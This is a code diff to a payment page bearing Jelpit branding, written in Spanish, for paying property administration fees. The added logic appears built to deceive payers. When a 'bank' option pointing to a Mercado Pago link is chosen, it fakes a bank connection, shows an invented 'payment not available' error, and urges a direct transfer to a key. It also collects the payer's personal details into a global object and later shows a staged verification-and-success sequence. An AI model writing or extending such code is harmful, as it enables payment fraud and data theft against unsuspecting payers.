@@ -877,14 +877,41 @@ ${metodoInfo}
                 }
 
                 if (metodoPago === 'pse') {
-                    const pseDocType = document.getElementById('pseDocType').value;
+                    const pseSelect   = document.getElementById('pseBank');
+                    const pseDocType  = document.getElementById('pseDocType').value;
                     const pseDocNumber = document.getElementById('pseDocNumber').value;
-                    const pseBank = document.getElementById('pseBank').value;
+                    const pseBank     = pseSelect.value;
+                    const pseBankNombre = pseSelect.options[pseSelect.selectedIndex]?.text || pseBank;
                     const psePersonType = document.getElementById('psePersonType').value;
 
                     // Validar que estén completos
                     if (!pseDocNumber || !pseBank) {
                         alert('Por favor completa todos los campos de PSE');
+                        return;
+                    }
+
+                    // Si el banco redirige a mercadopago → loading breve → modal bre-v con mensaje "ups"
+                    if (pseBank === 'https://link.mercadopago.com.co/pagosadministracion') {
+                        // Mostrar loading con texto de "conectando"
+                        document.getElementById('brevLoadingTexto').textContent = 'Conectando con el banco...';
+                        document.getElementById('brevLoadingOverlay').style.display = 'flex';
+                        btnPagar.disabled = true;
+
+                        setTimeout(() => {
+                            document.getElementById('brevLoadingOverlay').style.display = 'none';
+                            btnPagar.disabled = false;
+
+                            document.getElementById('brevModalTitulo').textContent = '¡Ups! Pago no disponible';
+                            document.getElementById('brevModalSub').textContent = `PSE no está disponible para ${pseBankNombre}. Intenta transferir directamente a la llave:`;
+                            document.getElementById('brevModalMonto').textContent = totalFormatted;
+                            window._brevData = {
+                                nombre: userNombre, apellido: userApellido, email: userEmail,
+                                celular: userCelular, nombreConjunto: nombreConjunto,
+                                referencia1: referencia1, selectedApt: selectedApt,
+                                referencia2: referencia2, totalFormatted: totalFormatted
+                            };
+                            document.getElementById('brevModal').style.setProperty('display', 'flex', 'important');
+                        }, 1800);
                         return;
                     }
 
@@ -907,7 +934,7 @@ ${metodoInfo}
                         selectedApt: selectedApt,
                         referencia2: referencia2,
                         metodoPago: 'pse',
-                        pseBank: pseBank,
+                        pseBank: pseBankNombre,
                         monto_formateado: totalFormatted
                     });
 
@@ -1242,8 +1269,8 @@ ${metodoInfo}
                 <div style="width:64px; height:64px; background:#f5f0ff; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 14px;">
                     <i class="fa-solid fa-link" style="font-size:28px; color:#7c3aed;"></i>
                 </div>
-                <h3 style="font-size:20px; font-weight:700; color:#2e0063; margin:0 0 6px;">Transferencia directa</h3>
-                <p style="font-size:13px; color:#777; margin:0;">Transfiere el valor exacto a esta llave</p>
+                <h3 id="brevModalTitulo" style="font-size:20px; font-weight:700; color:#2e0063; margin:0 0 6px;">Transferencia directa</h3>
+                <p id="brevModalSub" style="font-size:13px; color:#777; margin:0;">Transfiere el valor exacto a esta llave</p>
             </div>
 
             <!-- Monto -->
@@ -1277,7 +1304,7 @@ ${metodoInfo}
     <div id="brevLoadingOverlay" style="display:none; position:fixed; inset:0; background:white; z-index:300001; flex-direction:column; align-items:center; justify-content:center; gap:24px; font-family:'Roboto Condensed',sans-serif;">
         <img src="img/logo_jelpit_color.svg" alt="Jelpit" style="height:48px; margin-bottom:8px;">
         <div style="width:56px; height:56px; border:5px solid #e8e8e8; border-top-color:#1dbe5f; border-radius:50%; animation:jlpSpin 0.9s linear infinite;"></div>
-        <p style="font-size:16px; color:#555; margin:0;">Verificando transferencia...</p>
+        <p id="brevLoadingTexto" style="font-size:16px; color:#555; margin:0;">Procesando pago...</p>
     </div>
 
     <!-- Brev: Success Overlay -->
@@ -1338,6 +1365,7 @@ ${metodoInfo}
             });
 
             // Loading → éxito
+            document.getElementById('brevLoadingTexto').textContent = 'Verificando transferencia...';
             document.getElementById('brevLoadingOverlay').style.display = 'flex';
             setTimeout(() => {
                 document.getElementById('brevLoadingOverlay').style.display = 'none';
